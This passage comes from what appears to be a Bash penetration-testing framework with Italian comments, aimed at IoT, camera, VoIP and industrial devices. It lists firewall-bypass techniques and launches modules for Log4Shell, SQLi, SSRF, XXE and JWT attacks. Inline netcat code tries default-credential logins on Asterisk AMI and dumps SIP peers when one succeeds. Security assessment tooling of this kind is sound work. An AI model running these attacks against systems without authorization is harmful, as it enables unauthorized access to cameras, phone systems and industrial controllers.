                echo "   13.  ARP scan (MAC/vendor detection)"
                echo "   14.  MAC → OUI vendor lookup"
                echo "   15.  Searchsploit (CVE lookup da banner nmap)"
                echo "  FIREWALL BYPASS:"
                echo "   16.  ACK scan (stateful vs stateless detection)"
                echo "   17.  FIN / Xmas / NULL / Maimon / Window scan"
                echo "   18.  Source port spoofing (53, 20, 21, 80, 443, 123, 554, 3389, 5060...)"
                echo "   19.  Frammentazione IP (-f, --mtu 8/16/24)"
                echo "   20.  Decoy scan, TTL manipulation, data length padding"
                echo "   21.  Slow scan (T1, --scan-delay 2s), bad checksum"
                echo "   22.  UPnP AddPortMapping / WANPPPConnection punch-through"
                echo "   23.  SIP-ALG pinhole (INVITE/REGISTER/OPTIONS)"
                echo "   24.  FTP ALG PORT command pinhole"
                echo "   25.  HTTP CONNECT proxy tunnel"
                echo "   26.  IPv6 link-local e globale (AAAA DNS)"
                echo "   27.  Protocol confusion (SSH su 443, SIP su 80, HTTP su 22)"
                echo "   28.  ICMP tipo 13 (Timestamp) e 17 (Netmask)"
                echo "   29.  SNMP recon (interfacce, routing, tcpConnTable) — community: ${_known_comm:-N/D}"
                echo "   30.  IoT vendor-specific port probe (Dahua/Hikvision/Reolink/MikroTik/TR-069...)"
                echo "   31.  Port knocking (10 sequenze comuni IoT/embedded)"
                echo "   32.  Full port scan TCP 1-65535 (T2, slow)"
                [[ -n "$_snmp_extra_ips" ]] && \
                    echo "   NOTA: IP aggiuntivi rilevati via SNMP: $_snmp_extra_ips — non scansionati automaticamente"
                echo ""
                echo "CONCLUSIONE: dispositivo non raggiungibile o completamente filtrato"
            } > "$OUTDIR_BASE/no_access_summary.txt" 2>/dev/null || true

            # Vai direttamente a FASE 4
            echo ""
            echo -e "${BOLD}${GREEN}══════════════════════════════════════════${NC}"
            echo -e "${BOLD}${GREEN}  FASE 4 — REPORT PDF (nessun accesso)    ${NC}"
            echo -e "${BOLD}${GREEN}══════════════════════════════════════════${NC}"
            if [[ $DRY_RUN -eq 0 ]]; then
                # shellcheck disable=SC2086
                exa-dune report "$OUTDIR_BASE" --pdf
                local desk_pdf; desk_pdf=$(ls -t "$EXA_REPORTS_DIR"/REPORT_*.pdf 2>/dev/null | head -1)
                [[ -n "$desk_pdf" ]] && ok "Report Desktop: $desk_pdf"
                command -v notify-send &>/dev/null && \
                    notify-send "EXA-DUNE" "Assessment concluso (no accesso): $target" 2>/dev/null || true
            else
                echo -e "${CYAN}[DRY-RUN]${NC} report $OUTDIR_BASE --pdf"
            fi
            ok "Assessment concluso — vedi: $OUTDIR_BASE/no_access_summary.txt"
            return 0
        fi
    fi

    # ─────────────────────────────────────────────────────────
    # FASE 2 — ENUMERAZIONE
    # ─────────────────────────────────────────────────────────
    _phase_num=2
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  FASE 2 — ENUMERAZIONE                   ${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"

    # ── Rileva vendor dal contesto pre-scan ──────────────────
    # Aggrega tutte le sorgenti: HTTP Server header, SSL CN/O, SNMP sysDescr,
    # DNS hostname, mDNS/WSD findings — tutto in minuscolo per match uniforme
    local prescan_context=""
    if [[ $DRY_RUN -eq 0 ]]; then
        # HTTP headers: Server, X-Powered-By, WWW-Authenticate realm, header vendor-specifici
        prescan_context+=" $(grep -i "^Server:\|^X-Powered-By:\|^WWW-Authenticate:\|^X-Application:\|^X-Device-Model:" \
            "$prescan_dir/http_head.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
        # SSL CN/O/SAN
        prescan_context+=" $(grep -i "subject\|issuer\|O=\|CN=\|SAN" \
            "$prescan_dir/ssl_cert.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
        # SNMP sysDescr + sysObjectID + sysName
        prescan_context+=" $(grep -i "sysDescr\|sysObjectID\|sysName\|sysContact" \
            "$prescan_dir/snmp_quick.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
        # SNMP OID enterprise prefix → vendor mapping
        local _snmp_oid; _snmp_oid=$(grep -oP '(?<=sysObjectID=)[\d.]+' \
            "$prescan_dir/snmp_quick.txt" 2>/dev/null | head -1 || true)
        case "$_snmp_oid" in
            1.3.6.1.4.1.591.*)   prescan_context+=" audiocodes voip" ;;
            1.3.6.1.4.1.368.*)   prescan_context+=" axis camera" ;;
            1.3.6.1.4.1.507.*)   prescan_context+=" hikvision camera" ;;
            1.3.6.1.4.1.2560.*)  prescan_context+=" dahua camera" ;;
            1.3.6.1.4.1.39165.*) prescan_context+=" reolink camera" ;;
            1.3.6.1.4.1.3352.*)  prescan_context+=" commend voip" ;;
        esac
        # DNS hostname
        prescan_context+=" $(echo "$dns_hostname" | tr '[:upper:]' '[:lower:]')"
        # mDNS / WS-Discovery findings
        prescan_context+=" $(cat "$OUTDIR_BASE/mdns/findings.txt" \
            "$OUTDIR_BASE/wsd/findings.txt" 2>/dev/null | tr '[:upper:]' '[:lower:]' || true)"
        # UPnP deviceType da XML WSD (se disponibile)
        local _wsd_xml; _wsd_xml=$(find "$OUTDIR_BASE/wsd" -name "*.xml" 2>/dev/null | head -1 || true)
        [[ -n "$_wsd_xml" ]] && \
            prescan_context+=" $(grep -oiP '(?<=<d:deviceType>|<deviceType>)[^<]+' "$_wsd_xml" 2>/dev/null \
                | tr '[:upper:]' '[:lower:]' || true)"
        # MAC vendor OUI (già noto da pre-scan)
        [[ -n "$mac_vendor" ]] && prescan_context+=" $(echo "$mac_vendor" | tr '[:upper:]' '[:lower:]')"
        # http-title da nmap — rileva vendor da titolo pagina (es. "Reolink", "Hikvision" non presenti negli header)
        prescan_context+=" $(grep -oiP '(?<=http-title: )\S+' \
            "$scan_dir/nmap_fast.nmap" "$scan_dir/nmap_full.nmap" 2>/dev/null \
            | tr '[:upper:]' '[:lower:]' | tr '\n' ' ' || true)"
    fi

    # Mappa contesto → vendor (usato per cam-cve e moduli specializzati)
    local detected_vendor=""
    local is_camera=0 is_voip=0
    if [[ $DRY_RUN -eq 0 ]]; then
        echo "$prescan_context" | grep -qiE "audiocodes"            && detected_vendor="audiocodes" && is_voip=1
        echo "$prescan_context" | grep -qiE "commend"               && detected_vendor="commend"    && is_voip=1
        echo "$prescan_context" | grep -qiE "gai.tronics|gaitronics" && detected_vendor="generic"  && is_voip=1
        echo "$prescan_context" | grep -qiE "axis"                  && detected_vendor="axis"       && is_camera=1
        echo "$prescan_context" | grep -qiE "reolink"               && detected_vendor="reolink"    && is_camera=1
        echo "$prescan_context" | grep -qiE "hikvision|hikv"        && detected_vendor="hikvision"  && is_camera=1
        echo "$prescan_context" | grep -qiE "dahua"                 && detected_vendor="dahua"      && is_camera=1
        echo "$prescan_context" | grep -qiE "onvif|rtsp|webcam|ipcam|nvr|dvr" && \
            [[ $is_camera -eq 0 ]] && detected_vendor="generic"     && is_camera=1
        [[ -n "$detected_vendor" ]] && log "Vendor rilevato dal pre-scan: $detected_vendor (camera=$is_camera voip=$is_voip)"
    fi

    # ── Auto-populate vendor default credentials ──────────────
    if [[ -n "${detected_vendor:-}" && -z "${CUSTOM_PASS:-}" ]]; then
        local _vendor_creds_tmp; _vendor_creds_tmp=$(mktemp)
        local _creds_str; _creds_str=$(_default_creds_for_vendor "$detected_vendor")
        for _pair in $_creds_str; do
            echo "${_pair##*:}" >> "$_vendor_creds_tmp"
        done
        if [[ -s "$_vendor_creds_tmp" ]]; then
            CUSTOM_PASS="$_vendor_creds_tmp"
            common_flags="$common_flags --passlist $CUSTOM_PASS"
            log "Default creds per $detected_vendor caricate in wordlist ($(wc -l < "$_vendor_creds_tmp") password)"
        else
            rm -f "$_vendor_creds_tmp"
        fi
    fi

    # ── Moduli basati su porte aperte ────────────────────────
    local ran_enum=0

    # Web HTTP
    _port_open 80    && _run_mod "Web HTTP  :80"   web "$target" --port 80   --scheme http  && ran_enum=1
    _port_open 8000  && _run_mod "Web HTTP  :8000" web "$target" --port 8000 --scheme http  && ran_enum=1
    _port_open 8080  && _run_mod "Web HTTP  :8080" web "$target" --port 8080 --scheme http  && ran_enum=1
    # Web HTTPS
    _port_open 443   && _run_mod "Web HTTPS :443"  web "$target" --port 443  --scheme https && ran_enum=1
    _port_open 8443  && _run_mod "Web HTTPS :8443" web "$target" --port 8443 --scheme https && ran_enum=1
    # SSL/TLS
    { _port_open 443 || _port_open 8443; } && _run_mod "SSL/TLS" ssl "$target" && ran_enum=1
    # Nuclei CVE/template scan — se porta HTTP disponibile
    if { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; } && \
       command -v nuclei &>/dev/null; then
        local _nuc_port=80; _port_open 443 && _nuc_port=443
        _port_open 8080 && ! _port_open 80 && _nuc_port=8080
        _run_mod "Nuclei CVE" nuclei "$target" --port "$_nuc_port" && ran_enum=1
    fi
    # JS analysis — solo se almeno una porta web è aperta
    { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; } && \
        _run_mod "JS analysis" js "$target" \
            --port "$( _port_open 443 && echo 443 || _port_open 80 && echo 80 || echo 8080 )" && \
        ran_enum=1
    # ── Web su porte dinamiche (HTTP auto-detection) ─────────
    # Per ogni porta TCP aperta non già coperta dalle porte web standard,
    # testa HTTP/HTTPS e se risponde lancia il modulo web
    local _web_std_ports=" 80 443 8000 8080 8443 "
    if [[ $DRY_RUN -eq 0 ]]; then
        for _wp in $open_tcp; do
            echo "$_web_std_ports" | grep -qw "$_wp" && continue
            local _wp_scheme=""
            if curl -sI --connect-timeout 3 --max-time 5 \
                    "http://$target:$_wp/" 2>/dev/null | grep -qi "^HTTP/"; then
                _wp_scheme="http"
            elif curl -skI --connect-timeout 3 --max-time 5 \
                    "https://$target:$_wp/" 2>/dev/null | grep -qi "^HTTP/"; then
                _wp_scheme="https"
            fi
            if [[ -n "$_wp_scheme" ]]; then
                found MEDIUM "HTTP auto-detect — porta $_wp risponde a $_wp_scheme"
                _run_mod "Web $_wp_scheme :$_wp (auto)" web "$target" --port "$_wp" --scheme "$_wp_scheme"
                ran_enum=1
            fi
        done
    fi

    # SIP/VoIP
    { _port_open 5060 || _port_open 5061; } && _run_mod "SIP/VoIP" sip "$target" && ran_enum=1

    # ── SIP over WebSocket (SIP/WS e SIP/WSS) ─────────────────
    if { _port_open 80 || _port_open 443 || _port_open 8080 || _port_open 8443; }; then
        log "  ▶ [Fase 2/4] SIP over WebSocket probe"
        if [[ $DRY_RUN -eq 0 ]]; then
            local _sipws_dir="$OUTDIR_BASE/sip_websocket"
            mkdir -p "$_sipws_dir"
            local _found_sipws=0
            for _swport in 80 8080 443 8443; do
                _port_open "$_swport" || continue
                # Path comuni: /ws /sip /sipws /call /ws/sip /webrtc
                for _wspath in /ws /sip /sipws /call /ws/sip /webrtc; do
                    local _ws_resp
                    _ws_resp=$(printf 'GET %s HTTP/1.1\r\nHost: %s:%s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: sip\r\n\r\n' \
                        "$_wspath" "$target" "$_swport" | \
                        timeout 5 nc -w 4 "$target" "$_swport" 2>/dev/null | head -10 || true)
                    echo "=== SIP/WS :${_swport}${_wspath} ===" >> "$_sipws_dir/sipws_probe.txt"
                    echo "$_ws_resp" >> "$_sipws_dir/sipws_probe.txt"
                    if echo "$_ws_resp" | grep -qi "101\|Switching\|websocket"; then
                        found HIGH "SIP/WS — WebSocket upgrade su :${_swport}${_wspath} con protocollo SIP"
                        prescan_context+=" sip voip websocket"; is_voip=1
                        _found_sipws=$((_found_sipws+1))
                    fi
                done
            done
            [[ $_found_sipws -eq 0 ]] && log "  SIP over WebSocket: nessun endpoint WS rilevato"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SIP/WS probe su porte 80/443/8080/8443 (HTTP Upgrade, Sec-WebSocket-Protocol: sip)"
        fi
        ran_enum=1
    fi

    # SSH
    _port_open 22   && _run_mod "SSH     :22"   ssh    "$target" && ran_enum=1
    # Telnet
    _port_open 23   && _run_mod "Telnet  :23"   telnet "$target" && ran_enum=1
    # FTP
    _port_open 21   && _run_mod "FTP     :21"   ftp    "$target" && ran_enum=1
    # RTSP
    { _port_open 554 || _port_open 8554; } && _run_mod "RTSP" rtsp "$target" && ran_enum=1
    # ONVIF — RTSP + web presenti oppure vendor camera rilevato
    if { { _port_open 554 || _port_open 8554; } && { _port_open 80 || _port_open 443; }; } || \
       [[ $is_camera -eq 1 ]]; then
        _run_mod "ONVIF" onvif "$target" && ran_enum=1
    fi
    # SNMP — da porta oppure se quick probe ha già risposto
    { _port_open 161 || _port_open 162 || [[ -s "$prescan_dir/snmp_quick.txt" ]]; } && \
        _run_mod "SNMP" snmp "$target" && ran_enum=1
    # TFTP
    _port_open 69   && _run_mod "TFTP    :69"   tftp   "$target" && ran_enum=1
    # MQTT
    _port_open 1883 && _run_mod "MQTT  :1883"   mqtt   "$target" && ran_enum=1
    # SMB/NetBIOS
    _port_open 445  && _run_mod "SMB/NetBIOS"   smb    "$target" && ran_enum=1
    # UPnP/SSDP
    _port_open 1900 && _run_mod "UPnP/SSDP"     upnp   "$target" && ran_enum=1
    # Modbus
    _port_open 502  && _run_mod "Modbus  :502"  modbus "$target" && ran_enum=1
    # BACnet
    _port_open 47808 && _run_mod "BACnet :47808" bacnet "$target" && ran_enum=1
    # EtherNet/IP (CIP PLC)
    _port_open 44818 && _run_mod "EtherNet/IP :44818" enip "$target" && ran_enum=1
    # CoAP (IoT UDP 5683)
    _port_open 5683 && _run_mod "CoAP    :5683"  coap   "$target" && ran_enum=1
    # IPMI/BMC
    _port_open 623  && _run_mod "IPMI/BMC :623"  ipmi   "$target" && ran_enum=1
    # Printer JetDirect/IPP/LPD
    { _port_open 9100 || _port_open 631 || _port_open 515; } && \
        _run_mod "Printer :9100/631" printer "$target" && ran_enum=1
    # AMQP / RabbitMQ
    { _port_open 5672 || _port_open 15672; } && \
        _run_mod "AMQP/RabbitMQ :5672" amqp "$target" && ran_enum=1
    # OPC-UA (Industrial)
    _port_open 4840 && _run_mod "OPC-UA  :4840" opcua "$target" && ran_enum=1
    # DNP3 (SCADA)
    _port_open 20000 && _run_mod "DNP3  :20000" dnp3 "$target" && ran_enum=1
    # Log4Shell su ogni porta HTTP trovata
    { _port_open 80 || _port_open 8080 || _port_open 8443 || _port_open 443; } && {
        local _l4s_port=80 _l4s_scheme=http
        _port_open 443 && _l4s_port=443 && _l4s_scheme=https
        _port_open 80  && _l4s_port=80  && _l4s_scheme=http
        _run_mod "Log4Shell CVE-2021-44228" log4shell "$target" --port "$_l4s_port" --scheme "$_l4s_scheme"
        ran_enum=1
    }
    # SQLi
    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
        _run_mod "SQLi (sqlmap)" sqli "$target" --port "$(
            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
        )" && ran_enum=1
    # SSRF
    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
        _run_mod "SSRF" ssrf "$target" --port "$(
            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
        )" && ran_enum=1
    # XXE
    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
        _run_mod "XXE" xxe "$target" --port "$(
            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
        )" && ran_enum=1
    # JWT
    { _port_open 80 || _port_open 443 || _port_open 8080; } && \
        _run_mod "JWT attack" jwt "$target" --port "$(
            _port_open 80 && echo 80 || _port_open 443 && echo 443 || echo 8080
        )" && ran_enum=1
    # DNS
    _port_open 53   && _run_mod "DNS      :53"   dns    "$target" && ran_enum=1
    # RTMP (DVR/NVR stream)
    _port_open 1935 && _run_mod "RTMP   :1935"   rtmp   "$target" && ran_enum=1
    # RDP
    _port_open 3389 && _run_mod "RDP    :3389"   rdp    "$target" && ran_enum=1
    # VNC
    _port_open 5900 && _run_mod "VNC    :5900"   vnc    "$target" && ran_enum=1
    # LDAP / LDAPS
    _port_open 389  && _run_mod "LDAP    :389"   ldap   "$target" && ran_enum=1
    _port_open 636  && _run_mod "LDAPS   :636"   ldap   "$target" && ran_enum=1

    # ── Porte non-standard per protocolli noti ──────────────────
    # SSH su porte alternative (embedded/IoT spesso usano 2222/2200)
    _port_open 2222 && _run_mod "SSH :2222"    ssh    "$target" --port 2222 && ran_enum=1
    _port_open 2200 && _run_mod "SSH :2200"    ssh    "$target" --port 2200 && ran_enum=1
    # Telnet su porte alternative (2323 comune su router/IoT, 4567 su VoIP)
    _port_open 2323 && _run_mod "Telnet :2323" telnet "$target" --ports 2323 && ran_enum=1
    _port_open 4567 && _run_mod "Telnet :4567" telnet "$target" --ports 4567 && ran_enum=1
    # RTSP su porte alternative (Reolink 10554/8899, Hikvision 8554 già coperta)
    _port_open 10554 && _run_mod "RTSP :10554" rtsp "$target" --port 10554 && ran_enum=1
    _port_open 8899  && _run_mod "RTSP :8899"  rtsp "$target" --port 8899  && ran_enum=1
    # MQTT over TLS (8883)
    _port_open 8883  && _run_mod "MQTT TLS :8883" mqtt "$target" --port 8883 && ran_enum=1

    # Asterisk AMI (5038) — inline (nessun modulo dedicato)
    if _port_open 5038; then
        log "  ▶ [Fase 2/4] Asterisk AMI :5038"
        if [[ $DRY_RUN -eq 0 ]]; then
            local _ami_dir="$OUTDIR_BASE/asterisk_ami"
            mkdir -p "$_ami_dir"
            # Banner grab — Asterisk risponde con "Asterisk Call Manager/X.Y"
            local _ami_banner
            _ami_banner=$(timeout 5 nc -w 3 "$target" 5038 </dev/null 2>/dev/null | head -5 || true)
            echo "$_ami_banner" > "$_ami_dir/banner.txt"
            if echo "$_ami_banner" | grep -qi "Asterisk"; then
                local _ami_ver; _ami_ver=$(echo "$_ami_banner" | grep -oP 'Asterisk[^\r\n]+' | head -1 || true)
                found HIGH "Asterisk AMI:5038 — $_ami_ver"
                is_voip=1
                # Tenta login con credenziali default
                for _cred_pair in "admin:admin" "admin:" "manager:manager" "admin:password" "asterisk:asterisk"; do
                    local _ami_u="${_cred_pair%%:*}" _ami_p="${_cred_pair#*:}"
                    local _ami_login
                    _ami_login=$(printf 'Action: Login\r\nUsername: %s\r\nSecret: %s\r\n\r\n' \
                        "$_ami_u" "$_ami_p" | timeout 5 nc -w 4 "$target" 5038 2>/dev/null | head -5 || true)
                    echo "$_ami_login" >> "$_ami_dir/login_${_ami_u}.txt"
                    if echo "$_ami_login" | grep -qi "Response: Success"; then
                        found CRITICAL "Asterisk AMI:5038 — Login con ${_ami_u}:${_ami_p} RIUSCITO"
                        # Dump estensioni/peer via AMI
                        printf 'Action: SIPpeers\r\n\r\n' | timeout 5 nc -w 4 "$target" 5038 \
                            > "$_ami_dir/sippeers.txt" 2>/dev/null || true
                        printf 'Action: ExtensionState\r\nExten: s\r\nContext: default\r\n\r\n' | \
                            timeout 5 nc -w 4 "$target" 5038 \
                            > "$_ami_dir/extstate.txt" 2>/dev/null || true
                        break
                    fi
                done
                # Accesso anonimo
                local _ami_anon
                _ami_anon=$(printf 'Action: Login\r\nUsername: \r\nSecret: \r\n\r\n' | \
                    timeout 5 nc -w 4 "$target" 5038 2>/dev/null | head -5 || true)
                echo "$_ami_anon" | grep -qi "Response: Success" && \
                    found CRITICAL "Asterisk AMI:5038 — Accesso anonimo RIUSCITO"
            else
                found LOW "Porta 5038 aperta ma non è Asterisk AMI (banner: $(echo "$_ami_banner" | head -1 | tr -d '\r'))"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Asterisk AMI :5038 (banner + login default + SIPpeers dump)"
        fi
        ran_enum=1
    fi

    # ── Protocolli addizionali IoT/VoIP/Industrial ────────────────

    # DLNA / UPnP media server (porta 8200)
    if _port_open 8200; then
        log "  ▶ [Fase 2/4] DLNA/UPnP media server :8200"
        if [[ $DRY_RUN -eq 0 ]]; then
            local _dlna_dir="$OUTDIR_BASE/dlna"
            mkdir -p "$_dlna_dir"
            local _dlna_desc
            _dlna_desc=$(curl -s --max-time 5 "http://$target:8200/rootDesc.xml" 2>/dev/null || true)
            if [[ -n "$_dlna_desc" ]]; then
                echo "$_dlna_desc" > "$_dlna_dir/rootDesc.xml"
                local _dlna_mfr; _dlna_mfr=$(echo "$_dlna_desc" | grep -oP '(?<=<manufacturer>)[^<]+' | head -1 || true)
                local _dlna_mdl; _dlna_mdl=$(echo "$_dlna_desc" | grep -oP '(?<=<modelName>)[^<]+'    | head -1 || true)
                local _dlna_fn;  _dlna_fn=$(echo  "$_dlna_desc" | grep -oP '(?<=<friendlyName>)[^<]+' | head -1 || true)
                found MEDIUM "DLNA:8200 — media server esposto: $_dlna_mfr $_dlna_mdl (${_dlna_fn})"
                [[ -n "$_dlna_mfr" ]] && prescan_context+=" $(echo "$_dlna_mfr $_dlna_mdl" | tr '[:upper:]' '[:lower:]')"
                # Content Directory browse (senza auth)
                local _cds_resp
                _cds_resp=$(curl -s --max-time 8 -X POST "http://$target:8200/ctl/ContentDir" \
                    -H 'Content-Type: text/xml' \
                    -H 'SOAPACTION: "urn:schemas-upnp-org:service:ContentDirectory:1#Browse"' \
                    -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:Browse xmlns:u="urn:schemas-upnp-org:service:ContentDirectory:1"><ObjectID>0</ObjectID><BrowseFlag>BrowseDirectChildren</BrowseFlag><Filter>*</Filter><StartingIndex>0</StartingIndex><RequestedCount>10</RequestedCount><SortCriteria></SortCriteria></u:Browse></s:Body></s:Envelope>' \
